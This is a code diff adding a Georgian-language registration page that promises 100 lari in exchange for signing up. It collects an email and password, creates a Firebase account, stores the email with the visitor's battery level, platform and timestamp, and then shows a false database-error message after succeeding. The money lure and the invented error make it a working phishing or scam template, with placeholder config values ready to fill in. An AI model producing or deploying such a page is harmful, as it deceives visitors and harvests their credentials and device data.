@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+    <meta charset="UTF-8">
+    <title>რეგისტრაცია - 100₾</title>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; padding: 50px; }
+        .box { background: #2a2a2a; padding: 30px; border-radius: 10px; display: inline-block; }
+        input { display: block; width: 250px; padding: 10px; margin: 10px auto; border-radius: 5px; border: none; }
+        button { background: #28a745; color: white; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>გაიარე რეგისტრაცია</h2>
+        <p>თანხის მისაღებად აუცილებელია ავტორიზაცია</p>
+        <input type="email" id="email" placeholder="Email">
+        <input type="password" id="pass" placeholder="Password">
+        <button onclick="registerUser()">რეგისტრაცია</button>
+        <p id="msg"></p>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
+
+    <script>
+        // ჩასვი შენი კონფიგი აქ
+        const firebaseConfig = {
+            apiKey: "YOUR_API_KEY",
+            authDomain: "YOUR_PROJECT.firebaseapp.com",
+            databaseURL: "https://YOUR_PROJECT.firebaseio.com",
+            projectId: "YOUR_PROJECT",
+            storageBucket: "YOUR_PROJECT.appspot.com",
+            messagingSenderId: "ID",
+            appId: "APP_ID"
+        };
+        firebase.initializeApp(firebaseConfig);
+
+        async function registerUser() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            
+            try {
+                const res = await firebase.auth().createUserWithEmailAndPassword(email, pass);
+                
+                // ბატარეის და ქსელის გაგება
+                let batt = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batt = (b.level * 100).toFixed(0) + "%";
+                }
+
+                // მონაცემების შენახვა
+                await firebase.database().ref('users_data/' + res.user.uid).set({
+                    user_email: email,
+                    battery: batt,
+                    device: navigator.platform,
+                    ip_info: "Logged In",
+                    time: new Date().toLocaleString()
+                });
+
+                document.getElementById('msg').innerText = "შეცდომა ბაზასთან კავშირისას. სცადეთ მოგვიანებით.";
+            } catch (e) { alert(e.message); }
+        }
+    </script>
+</body>
+</html>
